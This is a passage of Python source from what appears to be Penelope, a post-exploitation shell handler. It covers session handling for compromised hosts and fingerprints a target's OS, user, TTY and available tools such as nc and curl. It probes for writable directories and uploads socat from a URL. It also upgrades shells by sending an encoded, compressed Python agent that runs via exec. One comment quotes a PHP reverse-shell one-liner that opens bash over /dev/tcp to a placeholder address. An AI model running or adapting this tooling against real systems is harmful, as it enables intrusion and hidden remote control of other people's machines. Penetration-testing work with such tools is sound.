                    f"{self.name_colored}{paint().green} 😍️ "
                    f"Assigned SessionID {paint('<' + str(self.id) + '>').yellow}"
                )

                self.directory = options.basedir / "sessions" / self.name
                if not options.no_log:
                    self.directory.mkdir(parents=True, exist_ok=True)
                    self.logpath = self.directory / f'{datetime.now().strftime("%Y_%m_%d-%H_%M_%S-%f")[:-3]}.log'
                    self.histfile = self.directory / "readline_history"
                    self.logfile = open(self.logpath, 'ab', buffering=0)
                    if not options.no_timestamps:
                        self.logfile.write(str(paint(datetime.now().strftime("%Y-%m-%d %H:%M:%S: ")).magenta).encode())

                for module in modules().values():
                    if module.enabled and module.on_session_start:
                        module.run(self)

                maintain_success = self.maintain()

                if options.single_session and self.listener:
                    self.listener.stop()

                if hasattr(listener_menu, 'active') and listener_menu.active:
                    os.close(listener_menu.control_w)
                    listener_menu.finishing.wait()

                attach_conditions = [
                    # Is a reverse shell and the Menu is not active and (reached the maintain value or maintain failed)
                    self.listener and not menu.active.is_set() and (len(core.hosts[self.name]) == options.maintain or not maintain_success),

                    # Is a bind shell and is not spawned from the Menu
                    not self.listener and not menu.active.is_set(),

                    # Is a bind shell and is spawned from the connect Menu command
                    not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect')
                ]

                # If no other session is attached
                if core.attached_session is None:
                    # If auto-attach is enabled
                    if not options.no_attach:
                        if any(attach_conditions):
                            # Attach the newly created session
                            self.attach()
                    else:
                        if self.id == 1:
                            menu.set_id(self.id)
                        if not menu.active.is_set():
                         menu.show()
            else:
                self.kill()
                time.sleep(1)
            return

    def __bool__(self):
        return self.socket.fileno() != -1 # and self.OS)

    def __repr__(self):
        try:
            return (
                f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
                f"interactive={self.interactive}, echoing={self.echoing})"
            )
        except:
            return f"ID: (for deletion: {self.id})"

    def __getattr__(self, name):
        if name == 'new_streamID':
            with self.stream_lock:
                if len(self.streams) == self.streams_max:
                    logger.error("Too many open streams...")
                    return None

                self.streamID += 1
                self.streamID = self.streamID % self.streams_max
                while struct.pack(self.stream_code, self.streamID) in self.streams:
                    self.streamID += 1
                    self.streamID = self.streamID % self.streams_max

                _stream_ID_hex = struct.pack(self.stream_code, self.streamID)
                self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)

                return self.streams[_stream_ID_hex]
        else:
            raise AttributeError(name)

    def fileno(self):
        return self.socket.fileno()

    @property
    def can_deploy_agent(self):
        if self._can_deploy_agent is None:
            if Path(self.directory / ".noagent").exists():
                self._can_deploy_agent = False
            else:
                _bin = self.bin['python3'] or self.bin['python']
                if _bin:
                    version = self.exec(f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True)
                    try:
                        major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
                    except:
                        self._can_deploy_agent = False
                        return self._can_deploy_agent
                    self.remote_python_version = (int(major), int(minor), int(micro))
                    if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
                        self._can_deploy_agent = True
                    else:
                        self._can_deploy_agent = False
                else:
                    self._can_deploy_agent = False

        return self._can_deploy_agent

    @property
    def spare_control_sessions(self):
        return [session for session in self.host_control_sessions if session is not self]

    @property
    def host_needs_control_session(self):
        return [session for session in core.hosts[self.name] if session.need_control_session]

    @property
    def need_control_session(self):
        return all([self.OS == 'Unix', self.type == 'PTY', not self.agent, not self.new])

    @property
    def host_control_sessions(self):
        return [session for session in core.hosts[self.name] if not session.need_control_session]

    @property
    def control_session(self):
        if self.need_control_session:
            for session in core.hosts[self.name]:
                if not session.need_control_session:
                    return session
            return None # TODO self.spawn()
        return self

    def get_system_info(self):
        self.hostname = self.system = self.arch = ''

        if self.OS == 'Unix':
            if not self.bin['uname']:
                return False

            response = self.exec(
                r'printf "$({0} -n)\t'
                r'$({0} -s)\t'
                r'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(self.bin['uname']),
                agent_typing=True,
                value=True
            )

            try:
                self.hostname, self.system, self.arch = response.split("\t")
            except:
                return False

        elif self.OS == 'Windows':
            self.systeminfo = self.exec('systeminfo', value=True)
            if not self.systeminfo:
                return False

            if (not "\n" in self.systeminfo) and ("OS Name" in self.systeminfo): #TODO TEMP PATCH
                self.exec("cd", force_cmd=True, raw=True)
                return False

            def extract_value(pattern):
                match = re.search(pattern, self.systeminfo, re.MULTILINE)
                return match.group(1).replace(" ", "_").rstrip() if match else ''

            self.hostname = extract_value(r"^Host Name:\s+(.+)")
            self.system = extract_value(r"^OS Name:\s+(.+)")
            self.arch = extract_value(r"^System Type:\s+(.+)")

        return True

    def get_shell_info(self, silent=False):
        self.shell_pid = self.get_shell_pid()
        self.user = self.get_user()
        if self.OS == 'Unix':
            self.tty = self.get_tty(silent=silent)

    def get_shell_pid(self):
        if self.OS == 'Unix':
            response = self.exec("echo $$", agent_typing=True, value=True)

        elif self.OS == 'Windows':
            return None # TODO

        if not (isinstance(response, str) and response.isnumeric()):
            logger.error(f"Cannot get the PID of the shell. Response:\r\n{paint(response).white}")
            return False
        return response

    def get_user(self):
        if self.OS == 'Unix':
            response = self.exec("echo \"$(id -un)($(id -u))\"", agent_typing=True, value=True)

        elif self.OS == 'Windows':
            if self.type == 'PTY':
                return None # TODO
            response = self.exec("whoami", value=True)

        return response or ''

    def get_tty(self, silent=False):
        response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
        if not (isinstance(response, str) and response.startswith('/')):
            if not silent:
                logger.error(f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}")
            return False
        return response

    @property
    def cwd(self):
        if self._cwd is None:
            if self.OS == 'Unix':
                cmd = (
                    f"readlink /proc/{self.shell_pid}/cwd 2>/dev/null || "
                    f"lsof -p {self.shell_pid} 2>/dev/null | awk '$4==\"cwd\" {{print $9;exit}}' | grep . || "
                    f"procstat -f {self.shell_pid} 2>/dev/null | awk '$3==\"cwd\" {{print $NF;exit}}' | grep . || "
                    f"pwdx {self.shell_pid} 2>/dev/null | awk '{{print $2;exit}}' | grep ."
                )
                self._cwd = self.exec(cmd, value=True)
            elif self.OS == 'Windows':
                self._cwd = self.exec("cd", force_cmd=True, value=True)
        return self._cwd or ''

    @property
    def is_attached(self):
        return core.attached_session is self

    @property
    def bin(self):
        if not self._bin:
            try:
                if self.OS == "Unix":
                    binaries = [
                        "sh", "bash", "python", "python3", "uname",
                        "script", "socat", "tty", "echo", "base64", "wget",
                        "curl", "tar", "rm", "stty", "setsid", "find", "nc"
                    ]
                    response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
                    if response:
                        self._bin = dict(zip(binaries, response.decode().splitlines()))

                    missing = [b for b in binaries if not os.path.isabs(self._bin[b])]

                    if missing:
                        logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
                        response = self.exec(
                            f'for bin in {" ".join(missing)}; do for dir in '
                            f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; ' # TODO PATH
                            'test -f $_bin && break || unset _bin; done; echo $_bin; done'
                        )
                        if response:
                         self._bin.update(dict(zip(missing, response.decode().splitlines())))

                for binary in options.no_bins:
                    self._bin[binary] = None

                result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
                logger.debug(f"Available binaries on target: \n{paint(result).red}")
            except:
                pass

        return self._bin

    @property
    def tmp(self):
        if self._tmp is None:
            if self.OS == "Unix":
                logger.debug("Trying to find a writable directory on target")
                tmpname = rand(10)
                common_dirs = ("/dev/shm", "/tmp", "/var/tmp")
                for directory in common_dirs:
                    if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
                        self.exec(f'rm {directory}/{tmpname}')
                        self._tmp = directory
                        break
                else:
                    candidate_dirs = self.exec("find / -type d -writable 2>/dev/null")
                    if candidate_dirs:
                        for directory in candidate_dirs.decode().splitlines():
                            if directory in common_dirs:
                                continue
                            if not self.exec(f'echo {tmpname} > {directory}/{tmpname}', value=True):
                                self.exec(f'rm {directory}/{tmpname}')
                                self._tmp = directory
                                break
                if not self._tmp:
                    self._tmp = False
                    logger.warning("Cannot find writable directory on target...")
                else:
                    logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

            elif self.OS == "Windows":
                self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)

        return self._tmp

    def agent_only(func):
        @wraps(func)
        def newfunc(self, *args, **kwargs):
            if not self.agent:
                if not self.upgrade_attempted and self.can_deploy_agent:
                    logger.warning("This can only run in python agent mode. I am trying to deploy the agent")
                    self.upgrade()
                    if not self.agent:
                        logger.error("Failed to deploy agent")
                        return False
                else:
                    logger.error("This can only run in python agent mode")
                    return False
            return func(self, *args, **kwargs)
        return newfunc

    def send(self, data, stdin=False):
        with self.wlock: #TODO
            if not self in core.rlist:
                return False

            self.outbuf.seek(0, io.SEEK_END)
            _len = self.outbuf.write(data)

            self.subchannel.allow_receive_shell_data = True

            if self not in core.wlist:
                core.wlist.append(self)
                if not stdin:
                    core.control << ""
            return _len

    def record(self, data, _input=False):
        self.last_lines << data
        if not options.no_log:
            self.log(data, _input)

    def log(self, data, _input=False):
        #data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
        data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

        if not options.no_timestamps:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S: ") #TEMP
            if not options.no_colored_timestamps:
                timestamp = paint(timestamp).magenta
            data = re.sub(rb'\r\n|\r|\n|\v|\f', rf"\g<0>{timestamp}".encode(), data)
        try:
            if _input:
                self.logfile.write(bytes(paint('ISSUED ==>').GREEN + ' ', encoding='utf8'))
            self.logfile.write(data)

        except ValueError:
            logger.debug("The session killed abnormally")

    def determine(self, path=False):

        var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))

        def expect(data):
            try:
                data = data.decode()
            except:
                return False

            if var_value1 + var_value2 in data:
                return True

            elif f"'{var_name1}' is not recognized as an internal or external command" in data:
                return re.search('batch file.\r\n', data, re.DOTALL)
            elif re.search('PS.*>', data, re.DOTALL):
                return True

            elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
                return re.search('or operable.*>', data, re.DOTALL)
            elif re.search('Microsoft Windows.*>', data, re.DOTALL):
                return True

        response = self.exec(
            f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
            raw=True,
            expect_func=expect
        )

        if response:
            response = response.decode()

            if var_value1 + var_value2 in response:
                self.OS = 'Unix'
                self.prompt = re.search(f"{var_value1}{var_value2}\n(.*)", response, re.DOTALL)
                if self.prompt:
                    self.prompt = self.prompt.group(1).encode()
                self.interactive = bool(self.prompt)
                self.echoing = f"echo ${var_name1}${var_value1}" in response

            elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
                    re.search('Microsoft Windows.*>', response, re.DOTALL):
                self.OS = 'Windows'
                self.type = 'Raw'
                self.subtype = 'cmd'
                self.interactive = True
                self.echoing = True
                prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
                self.prompt = prompt[1].encode() if prompt else b""
                win_version = re.search(r"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)
                if win_version:
                    self.win_version = win_version[1]

            elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
                    re.search('PS.*>', response, re.DOTALL):
                self.OS = 'Windows'
                self.type = 'Raw'
                self.subtype = 'psh'
                self.interactive = True
                self.echoing = False
                self.prompt = response.splitlines()[-1].encode()

        else: #TODO check if it is needed
            def expect(data):
                try:
                    data = data.decode()
                except:
                    return False
                if var_value1 + var_value2 in data:
                    return True

            response = self.exec(
                f"${var_name1}='{var_value1}'; ${var_name2}='{var_value2}'; echo ${var_name1}${var_name2}\r\n",
                raw=True,
                expect_func=expect
            )
            if not response:
                return False
            response = response.decode()

            if var_value1 + var_value2 in response:
                self.OS = 'Windows'
                self.type = 'Raw'
                self.subtype = 'psh'
                self.interactive = not var_value1 + var_value2 == response
                self.echoing = False
                self.prompt = response.splitlines()[-1].encode()
                if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
                    self.type = 'PTY'
                    columns, lines = shutil.get_terminal_size()
                    cmd = (
                        f"$width={columns}; $height={lines}; "
                        "$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
                        "$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
                        "-ArgumentList ($width, $height)"
                    )
                    self.exec(cmd)
                    self.prompt = response.splitlines()[-2].encode()
                else:
                    self.prompt = re.sub(var_value1.encode() + var_value2.encode(), b"", self.prompt)

        self.get_shell_info(silent=True)
        if self.tty:
            self.type = 'PTY'
        if self.type == 'PTY':
            self.pty_ready = True
        return True

    def exec(
        self,
        cmd=None,         # The command line to run
        raw=False,         # Delimiters
        value=False,        # Will use the output elsewhere?
        timeout=False,        # Timeout
        expect_func=None,    # Function that determines what to wait for in the response
        force_cmd=False,    # Execute cmd command from powershell
        separate=False,        # If true, send cmd via this method but receive with TLV method (agent)
                    # --- Agent only args ---
        agent_typing=False,    # Simulate typing on shell
        python=False,        # Execute python command
        stdin_src=None,        # stdin stream source
        stdout_dst=None,    # stdout stream destination
        stderr_dst=None,    # stderr stream destination
        stdin_stream=None,    # stdin_stream object
        stdout_stream=None,    # stdout_stream object
        stderr_stream=None,    # stderr_stream object
        agent_control=None    # control queue
    ):
        if caller() == 'session_end':
            value = True

        if self.agent and not agent_typing: # TODO environment will not be the same as shell
            if cmd:
                cmd = dedent(cmd)
                if value:
                    buffer = io.BytesIO()
                timeout = options.short_timeout if value else None

                if not stdin_stream:
                    stdin_stream = self.new_streamID
                    if not stdin_stream:
                        return
                if not stdout_stream:
                    stdout_stream = self.new_streamID
                    if not stdout_stream:
                        return
                if not stderr_stream:
                    stderr_stream = self.new_streamID
                    if not stderr_stream:
                        return

                _type = 'S'.encode() if not python else 'P'.encode()
                self.send(Messenger.message(
                    Messenger.EXEC, _type +
                    stdin_stream.id +
                    stdout_stream.id +
                    stderr_stream.id +
                    cmd.encode()
                ))
                logger.debug(cmd)
                #print(stdin_stream.id, stdout_stream.id, stderr_stream.id)

                rlist = []
                if stdin_src:
                    rlist.append(stdin_src)
                if stdout_dst or value:
                    rlist.append(stdout_stream)
                if stderr_dst or value:
                    rlist.append(stderr_stream) # FIX
                if not rlist:
                    return True

                #rlist = [self.subchannel.control, stdout_stream, stderr_stream]
                #if stdin_src:
                #    rlist.append(stdin_src)

                if not agent_control:
                    agent_control = self.subchannel.control # TEMP
                rlist.append(agent_control)
                while rlist != [agent_control]:
                    r, _, _ = select(rlist, [], [], timeout)
                    timeout = None

                    if not r:
                        #stdin_stream.terminate()
                        #stdout_stream.terminate()
                        #stderr_stream.terminate()
                        break # TODO need to clear everything first

                    for readable in r:

                        if readable is agent_control:
                            command = agent_control.get()
                            if command == 'stop':
                                # TODO kill task here...
                                break

                        if readable is stdin_src:
                            if hasattr(stdin_src, 'read'): # FIX
                                data = stdin_src.read(options.network_buffer_size)
                            elif hasattr(stdin_src, 'recv'):
                                try:
                                    data = stdin_src.recv(options.network_buffer_size)
                                except OSError:
                                    pass # TEEEEMP
                            stdin_stream.write(data)
                            if not data:
                                #stdin_stream << b""
                                rlist.remove(stdin_src)

                        if readable is stdout_stream:
                            data = readable.read(options.network_buffer_size)
                            if value:
                                buffer.write(data)
                            elif stdout_dst:
                                if hasattr(stdout_dst, 'write'): # FIX
                                    stdout_dst.write(data)
                                    stdout_dst.flush()
                                elif hasattr(stdout_dst, 'sendall'):
                                    try:
                                        stdout_dst.sendall(data) # maybe broken pipe
                                        if not data:
                                            if stdout_dst in rlist:
                                                rlist.remove(stdout_dst)
                                    except:
                                        if stdout_dst in rlist:
                                            rlist.remove(stdout_dst)
                            if not data:
                                rlist.remove(readable)
                                del self.streams[readable.id]

                        if readable is stderr_stream:
                            data = readable.read(options.network_buffer_size)
                            if value:
                                buffer.write(data)
                            elif stderr_dst:
                                if hasattr(stderr_dst, 'write'): # FIX
                                    stderr_dst.write(data)
                                    stderr_dst.flush()
                                elif hasattr(stderr_dst, 'sendall'):
                                    try:
                                        stderr_dst.sendall(data) # maybe broken pipe
                                        if not data:
                                            if stderr_dst in rlist:
                                                rlist.remove(stderr_dst)
                                    except:
                                        if stderr_dst in rlist:
                                            rlist.remove(stderr_dst)
                            if not data:
                                rlist.remove(readable)
                                del self.streams[readable.id]
                    else:
                        continue
                    break

                stdin_stream << b"" # TOCHECK
                stdin_stream.write(b"")
                os.close(stdin_stream._read)
                del self.streams[stdin_stream.id]

                return buffer.getvalue().rstrip().decode() if value else True
            return None

        with self.lock:
            if self.need_control_session:
                args = locals()
                del args['self']
                try:
                    response = self.control_session.exec(**args)
                    return response
                except AttributeError: # No control session
                    logger.error("Spawn MANUALLY a new shell for this session to operate properly")
                    return None

            if not self or not self.subchannel.can_use:
                logger.debug("Exec: The session is killed")
                return False

            self.subchannel.control.clear()
            self.subchannel.active = True
            self.subchannel.result = None
            buffer = io.BytesIO()
            _start = time.perf_counter()

            # Constructing the payload
            if cmd is not None:
                if force_cmd and self.subtype == 'psh':
                    cmd = f"cmd /c '{cmd}'"
                initial_cmd = cmd
                cmd = cmd.encode()

                if raw:
                    if self.OS == 'Unix':
                        echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
                        cmd = b' ' + cmd + b'\n'

                    elif self.OS == 'Windows':
                        cmd = cmd + b'\r\n'
                        echoed_cmd_regex = re.escape(cmd)
                else:
                    token = [rand(10) for _ in range(4)]

                    if self.OS == 'Unix':
                        cmd = (
                            f" {token[0]}={token[1]} {token[2]}={token[3]};"
                            f"printf ${token[0]}${token[2]};"
                            f"{cmd.decode()};"
                            f"printf ${token[2]}${token[0]}\n".encode()
                        )

                    elif self.OS == 'Windows': # TODO fix logic
                        if self.subtype == 'cmd':
                            cmd = (
                                f"set {token[0]}={token[1]}&set {token[2]}={token[3]}\r\n"
                                f"echo %{token[0]}%%{token[2]}%&{cmd.decode()}&"
                                f"echo %{token[2]}%%{token[0]}%\r\n".encode()
                            )
                        elif self.subtype == 'psh':
                            cmd = (
                                f"$env:{token[0]}=\"{token[1]}\";$env:{token[2]}=\"{token[3]}\"\r\n"
                                f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
                                f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
                            )
                        # TODO check the maxlength on powershell
                        if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
                            logger.error(f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
                            return False

                    self.subchannel.pattern = re.compile(
                        rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
                        rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

                logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
                logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
                if self.agent and agent_typing:
                    cmd = Messenger.message(Messenger.SHELL, cmd)
                self.send(cmd)
                self.subchannel.allow_receive_shell_data = False # TODO

            data_timeout = options.short_timeout if timeout is False else timeout
            continuation_timeout = options.latency
            timeout = data_timeout

            last_data = time.perf_counter()
            need_check = False
            try:
                while self.subchannel.result is None:
                    logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
                    readables, _, _ = select([self.subchannel.control, self.subchannel], [], [], timeout)

                    if self.subchannel.control in readables:
                        command = self.subchannel.control.get()
                        logger.debug(f"Subchannel Control Queue: {command}")

                        if command == 'stop':
                            self.subchannel.result = False
                            break

                    if self.subchannel in readables:
                        logger.debug(f"Latency: {time.perf_counter() - last_data}")
                        last_data = time.perf_counter()

                        data = self.subchannel.read()
                        buffer.write(data)
                        logger.debug(f"{paint('Received').GREEN} -> {data}")

                        if timeout == data_timeout:
                            timeout = continuation_timeout
                            need_check = True

                    else:
                        if timeout == data_timeout:
                            logger.debug(paint("TIMEOUT").RED)
                            self.subchannel.result = False
                            break
                        else:
                            need_check = True
                            timeout = data_timeout
                    
                    if need_check:
                        need_check = False

                        if raw and self.echoing and cmd:
                            result = buffer.getvalue()
                            if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
                                self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
                                break
                            else:
                                logger.debug("The echoable is not exhausted")
                                continue
                        if not raw:
                            check = self.subchannel.pattern.search(buffer.getvalue())
                            if check:
                                logger.debug(paint('Got all data!').green)
                                self.subchannel.result = check[1]
                                break
                            logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

                        elif expect_func:
                            if expect_func(buffer.getvalue()):
                                logger.debug(paint("The expected strings found in data").yellow)
                                self.subchannel.result = buffer.getvalue()
                            else:
                                logger.debug(paint('No expected strings found in data. Receive again...').yellow)
                        else:
                            logger.debug(paint('Maybe got all data !?').yellow)
                            self.subchannel.result = buffer.getvalue()
                            break
            except:
                self.subchannel.can_use = False
                self.subchannel.result = False

            _stop = time.perf_counter()
            logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

            if value and self.subchannel.result is not False:
                self.subchannel.result = self.subchannel.result.strip().decode() # TODO check strip
            logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
            self.subchannel.active = False

            if separate and self.subchannel.result:
             self.subchannel.result = re.search(rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
             buffer = io.BytesIO()
             for _type, _value in self.messenger.feed(self.subchannel.result):
                 buffer.write(_value)
             return buffer.getvalue()

            return self.subchannel.result

    def need_binary(self, name, url):
        options = (
            f"\n  1) Upload {paint(url).blue}{paint().magenta}"
            f"\n  2) Upload local {name} binary"
            f"\n  3) Specify remote {name} binary path"
             "\n  4) None of the above\n"
        )
        print(paint(options).magenta)
        answer = ask("Select action: ")

        if answer == "1":
            return self.upload(
                url,
                remote_path="/var/tmp",
                randomize_fname=False
            )[0]

        elif answer == "2":
            local_path = ask(f"Enter {name} local path: ")
            if local_path:
                if os.path.exists(local_path):
                    return self.upload(
                        local_path,
                        remote_path=self.tmp,
                        randomize_fname=False
                    )[0]
                else:
                    logger.error("The local path does not exist...")

        elif answer == "3":
            remote_path = ask(f"Enter {name} remote path: ")
            if remote_path:
                if not self.exec(f"test -f {remote_path} || echo x"):
                    return remote_path
                else:
                    logger.error("The remote path does not exist...")

        elif answer == "4":
            return False

        return self.need_binary(name, url)

    def upgrade(self):
        self.upgrade_attempted = True
        if self.OS == "Unix":
            if self.agent:
                logger.warning("Python Agent is already deployed")
                return False

            if self.host_needs_control_session and self.host_control_sessions == [self]:
                logger.warning("This is a control session and cannot be upgraded")
                return False

            if self.pty_ready:
                if self.can_deploy_agent:
                    logger.info("Attempting to deploy Python Agent...")
                else:
                    logger.warning("This shell is already PTY")
            else:
                logger.info("Attempting to upgrade shell to PTY...")

            self.shell = self.bin['bash'] or self.bin['sh']
            if not self.shell:
                logger.warning("Cannot detect shell. Abort upgrading...")
                return False

            if self.can_deploy_agent:
                _bin = self.bin['python3'] or self.bin['python']
                if self.remote_python_version >= (3,):
                    _decode = 'b64decode'
                    _exec = 'exec(cmd, globals(), locals())'
                else:
                    _decode = 'decodestring'
                    _exec = 'exec cmd in globals(), locals()'

                agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
                    self.shell,
                    options.network_buffer_size,
                    MESSENGER,
                    STREAM,
                    self.bin['sh'] or self.bin['bash'],
                    _exec
                )
                payload = base64.b64encode(compress(agent.encode(), 9)).decode()
                cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''

            elif not self.pty_ready:
                socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
                if self.bin['script']:
                    _bin = self.bin['script']
                    cmd = f"{_bin} -q /dev/null; exit 0"

                elif self.bin['socat']:
                    _bin = self.bin['socat']
                    cmd = socat_cmd.format(_bin)

                else:
                    _bin = "/var/tmp/socat"
                    if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
                        cmd = socat_cmd.format(_bin)
                    else:
                        logger.warning("Cannot upgrade shell with the available binaries...")
                        socat_binary = self.need_binary("socat", URLS['socat'])
                        if socat_binary:
                            _bin = socat_binary
                            cmd = socat_cmd.format(_bin)
                        else:
                            if readline:
                                logger.info("Readline support enabled")
                                self.type = 'Readline'
                                return True
                            else:
                                logger.error("Falling back to Raw shell")
                                return False

            if not self.can_deploy_agent and not self.spare_control_sessions:
                logger.warning("Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY")
                core.session_wait_host = self.name
                self.spawn()
                try:
                    new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
                    core.session_wait_host = None

                except queue.Empty:
                    logger.error("Failed spawning new session")
                    return False

                if self.pty_ready:
                    return True

            if self.pty_ready:
                self.exec("stty -echo")
                self.echoing = False

            elif self.interactive:
                # Some shells are unstable in interactive mode
                # For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
                # Silently convert the shell to non-interactive before PTY upgrade.
                self.interactive = False
                self.echoing = True
                self.exec(f"exec {self.shell}", raw=True)
                self.echoing = False

            response = self.exec(
                f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
                separate=self.can_deploy_agent,
                expect_func=lambda data: not self.can_deploy_agent or b"\x01" in data,
                raw=True
            )
            if self.can_deploy_agent and not isinstance(response, bytes):
                logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
                Path(self.directory / ".noagent").touch()
                self.kill()
                return False

            logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")

            self.agent = self.can_deploy_agent
            self.type = 'PTY'
            self.interactive = True
            self.echoing = True
            self.prompt = response

            self.get_shell_info()

            if _bin == self.bin['script']:
                self.exec("stty sane")

        elif self.OS == "Windows":
            if self.type != 'PTY':
                self.type = 'Readline'
                logger.info("Added readline support...")

        return True

    def update_pty_size(self):
        columns, lines = shutil.get_terminal_size()
        if self.OS == 'Unix':
            if self.agent:
                self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
            else: # TODO
                threading.Thread(
                    target=self.exec,
                    args=(f"stty rows {lines} columns {columns} < {self.tty}",),
                    name="RESIZE"
                ).start() #TEMP
        elif self.OS == 'Windows': # TODO
            pass

    def readline_loop(self):
        while core.attached_session == self:
            try:
                cmd = input("\033[s\033[u", self.histfile, options.histlength, None, "\t") # TODO
                if self.subtype == 'cmd':
                    assert len(cmd) <= MAX_CMD_PROMPT_LEN
                #self.record(b"\n" + cmd.encode(), _input=True)

            except EOFError:
                self.detach()
                break
            except AssertionError:
                logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
            else:
                self.send(cmd.encode() + b"\n")

    def attach(self):
        if threading.current_thread().name != 'Core':
            if self.new:
                upgrade_conditions = [
                    not options.no_upgrade,
                    not (self.need_control_session and self.host_control_sessions == [self]),
                    not self.upgrade_attempted
                ]
                if all(upgrade_conditions):
                    self.upgrade()
                if self.prompt:
                    self.record(self.prompt)
                self.new = False

            core.control << f'self.sessions[{self.id}].attach()'
            menu.active.clear() # Redundant but safeguard
            return True

        if core.attached_session is not None:
            return False

        if self.type == 'PTY':
            escape_key = options.escape['key']
        elif self.type == 'Readline':
            escape_key = 'Ctrl-D'
        else:
            escape_key = 'Ctrl-C'

        logger.info(
            f"Interacting with session {paint('[' + str(self.id) + ']').red}"
            f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
            f"{paint(escape_key).MAGENTA} "
        )

        if not options.no_log:
            logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")
        print(paint('─').DIM * shutil.get_terminal_size()[0])

        core.attached_session = self
        core.rlist.append(sys.stdin)

        stdout(bytes(self.last_lines))

        if self.type == 'PTY':
            tty.setraw(sys.stdin)
            os.kill(os.getpid(), signal.SIGWINCH)

        elif self.type == 'Readline':
            threading.Thread(target=self.readline_loop).start()

        self._cwd = None
        return True

    def sync_cwd(self):
        self._cwd = None
        if self.agent:
            self.exec(f"os.chdir('{self.cwd}')", python=True, value=True)
        elif self.need_control_session:
            self.exec(f"cd {self.cwd}")

    def detach(self):
        if self and self.OS == 'Unix' and (self.agent or self.need_control_session):
            threading.Thread(target=self.sync_cwd).start()

        if threading.current_thread().name != 'Core':
            core.control << f'self.sessions[{self.id}].detach()'
            return

        if core.attached_session is None:
            return False

        core.wait_input = False
        core.attached_session = None
        core.rlist.remove(sys.stdin)

        if self.type == 'PTY':
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

        if self.id in core.sessions:
            print()
            logger.warning("Session detached ⇲")
            menu.set_id(self.id)
        else:
            if options.single_session and not core.sessions:
                core.stop()
                logger.info("Penelope exited due to Single Session mode")
                return
            menu.set_id(None)
        menu.show()

        return True

    def download(self, remote_items):
        # Initialization
        try:
            shlex.split(remote_items) # Early check for shlex errors
        except ValueError as e:
            logger.error(e)
            return []

        local_download_folder = self.directory / "downloads"
        try:
            local_download_folder.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            logger.error(e)
            return []

        if self.OS == 'Unix':
            # Check for local available space
            available_bytes = shutil.disk_usage(local_download_folder).free
            if self.agent:
                block_size = os.statvfs(local_download_folder).f_frsize
                response = self.exec(f"{GET_GLOB_SIZE}"
                    f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()",
                    python=True,
                    value=True
                )
                try:
                    remote_size = int(float(response))
                except:
